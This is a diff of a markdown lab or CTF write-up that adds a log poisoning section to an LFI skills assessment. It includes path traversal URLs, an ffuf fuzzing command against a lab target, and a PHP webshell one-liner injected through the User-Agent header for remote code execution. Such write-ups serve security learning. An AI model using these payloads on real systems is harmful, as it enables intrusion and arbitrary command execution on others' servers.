@@ -175,12 +175,22 @@ cat index.php | grep -ie 'Admin'
 ![LFI-skills-assess-identified](/images/LFI-skills-assess-identified.png)  
 
 >By Assessing the admin page discovered in the PHP source code comment, and using the `log` parameter to read files. 
->This technique to gain remote code execution and find a flag in the / root directory of the file system. Submit the contents of the flag as your answer.  
+>Log Poisoning technique to gain remote code execution and find a flag in the / root directory of the file system.  
 
+### Log Poison  
 
+>The FFUF command identified the `nginx.conf` file that indicate the path to the access logs as `/var/log/nginx/access.log`.  
 
+```
+ffuf -c -ic -w /usr/share/seclists/Fuzzing/XSS/XSS-With-Context-Jhaddix.txt:FUZZ -u 'http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../..FUZZ' -replay-proxy http://127.0.0.1:8080 -fs 2046
+``` 
 
-http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../../etc/php/7.3/fpm/php.ini
+>In the log we notice the `user-agent` is reflected and stored.
+>PHP webshell code inserted as the value of `User-Agent`:  
 
+```
+<?php system($_GET['cmd']); ?>
+```  
 
-http://94.237.49.11:53690/ilf_admin/index.php?log=../../../../../../../../../../var/www/html/main.php
+![LFI-skills-assess-log-poison](/images/LFI-skills-assess-log-poison.png)  
+
